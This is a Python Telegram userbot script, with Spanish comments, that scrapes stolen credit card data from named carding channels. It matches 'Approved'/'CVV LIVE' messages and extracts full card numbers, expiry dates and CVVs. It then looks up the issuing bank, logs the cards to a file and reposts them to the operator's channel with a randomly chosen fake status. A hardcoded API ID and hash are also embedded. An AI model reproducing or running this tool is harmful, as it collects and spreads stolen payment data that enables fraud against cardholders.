import time
import telethon
import asyncio
import os
import re
from telethon import TelegramClient, events
import random
import requests
from telegraph import Telegraph

API_ID = 20597671  # tu api id
API_HASH = 'e89f2c4056dd402bef8299bce660cbcd'  # tu api hash
SEND_CHAT = -1001850450912  # chat o canal donde se envian las ccs

client = TelegramClient('session', API_ID, API_HASH)

chats = [
    '@retroccs', '@ritagroupOfc', '@inkbins', '@JohnnySinsChat',
    '@savagegroupoficial', '@coredrops', '@dSnowChat',
    '@kurumyb0t', '@funcionabinsnewchat'
]

PALABRAS_CLAVE = [
    "APPROVED", "Approved", "Succeeded! 🤑", "APPROVED ✅",
    "✅✅✅ Approved ✅✅✅", "Approved CCN", "Approved #AUTH! ✅",
    "Approved ❇️", "APPROVED ✓", "✅Appr0ved", "Security code incorrect✅",
    "CVV2 FAILURE POSSIBLE CVV ⌯ N - AVS: G", "Succeeded",
    "𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅 𝑪𝒂𝒓𝒅 ✅", "𝑪𝒉𝒂𝒓𝒈𝒆𝒅 𝟎.𝟐𝟓$", "(1000: Approved! ✅)",
    "Subscription complete", "CVV LIVE ✅", "cardCvv (INVALID_SECURITY_CODE)"
]

async def extract_cc_info(cc):
    pattern1 = r'\b(\d{4}\s?\d{4}\s?\d{4}\s?\d{4})\b|\b(\d{4}\s?\d{6}\s?\d{5})\b'
    pattern2 = r'\b(\d{4}\s?\d{4}\s?\d{4}\s?\d{3})\b|\b(\d{4}\s?\d{6}\s?\d{4})\b'
    match = re.search(pattern1, cc) or re.search(pattern2, cc)
    if match:
        cc_number = match.group(0).replace(' ', '')
        pattern = r'\b(\d{2})\b.*\b(\d{2}|\d{4})\b.*\b(\d{3})\b'
        match = re.search(pattern, cc)
        if match:
            ano = f"20{match.group(2)}" if len(match.group(2)) == 2 else match.group(2)
            return cc_number, match.group(1), ano, match.group(3)
    return None, None, None, None

def get_sent_cards():
    if os.path.exists("cards.txt"):
        with open("cards.txt", "r") as f:
            return [line.strip() for line in f.readlines()]
    return []

@client.on(events.MessageEdited(chats=chats))
async def new_order(event):
    try:
        mensaje = event.message.message
        if not any(p in mensaje for p in PALABRAS_CLAVE):
            return

        cc_number, mes, ano, cvv = await extract_cc_info(mensaje)
        if None in [cc_number, mes, ano, cvv]:
            return

        if cc_number in get_sent_cards():
            return

        with open("cards.txt", "a") as f:
            f.write(f"{cc_number}\n")

        try:
            bin_data = requests.get(f'https://lookup.binlist.net/{cc_number[:6]}')
            bin_data.raise_for_status()
            bin_json = bin_data.json()
        except Exception as e:
            print(f"Error consultando BIN: {e}")
            return

        r1 = ["Approved", "Subscription complete", "Charged 1$", "Your card's security code is incorrect"]
        r2 = random.choice(r1)

        telegraph = Telegraph()
        telegraph.create_account(short_name='Ibai')
        titulo = "Resultado de tarjeta"
        plantilla_html = f"<h1>{titulo}</h1><p>Tarjeta: {cc_number}</p>"

        response = telegraph.create_page(
            title=titulo,
            html_content=plantilla_html,
            author_name="Ibai Scraper"
        )

        link = response["url"]
        fullinfo = f"{cc_number}|{mes}|{ano}|{cvv}"
        extra = f"{cc_number[:12]}xxxx"

        plantilla = f"""
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
      点 𝙸𝚋𝚊𝚒 𝚂𝚌𝚛𝚊𝚙𝚙𝚎𝚛 点
▬▬▬▬▬▬▬▬▬▬▬▬▬▬
Card ➪ `{link}`
Status ➪ `Approved ✅`
Response ➪ `{r2}`
━━━━━━━━━━━━━━━━
☘ INFO CARD ☘
━━━━━━━━━━━━━━━━
[🝂] Bin ➪ `{cc_number[:6]}`
[🝂] Info ➪ `{bin_json['scheme']} - {bin_json['type']} - {bin_json['brand']}`
[🝂] Bank ➪ `{bin_json['bank']['name']}`
[🝂] Country ➪ `{bin_json['country']['name']} - {bin_json['country']['emoji']}`
━━━━━━━━━━━━━━━━
[🝂] Extra ➪ `{extra}|{mes}|{ano}|{cvv}`
━━━━━━━━━━━━━━━━
        """

        print(fullinfo)
        with open('cards.txt', 'a') as w:
            w.write(fullinfo + '\n')

        await client.send_message(SEND_CHAT, plantilla, file='ibai-koi.mp4')
        await asyncio.sleep(1)

    except Exception as ex:
        print(f'Exception: {ex}')

async def main():
    print('CODIGO EN LINEA @DARWINOFICIAL')
    await client.start()
    await client.run_until_disconnected()

asyncio.run(main())
